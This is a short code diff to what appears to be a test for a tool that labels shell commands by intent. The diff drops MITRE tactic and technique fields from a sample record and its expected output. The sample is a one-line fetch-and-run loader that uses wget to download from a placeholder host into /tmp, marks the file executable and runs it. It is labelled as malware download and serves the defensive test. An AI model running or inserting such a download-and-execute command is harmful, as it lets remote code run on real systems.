@@ -42,15 +42,11 @@ def main() -> int:
     cmd = "wget http://x/y -O /tmp/z && chmod +x /tmp/z && /tmp/z"
     parsed = SimpleNamespace(
         intent="malware_download",
-        tactics=["TA0011"],
-        techniques=["T1105"],
         description="Curl-and-run loader; downloads and executes payload.",
     )
-    ctx = ["intent", "tactics", "techniques", "description"]
+    ctx = ["intent", "description"]
     expected_head = (
         "intent: malware_download. "
-        "tactics: TA0011. "
-        "techniques: T1105. "
         "Curl-and-run loader; downloads and executes payload."
     )
 
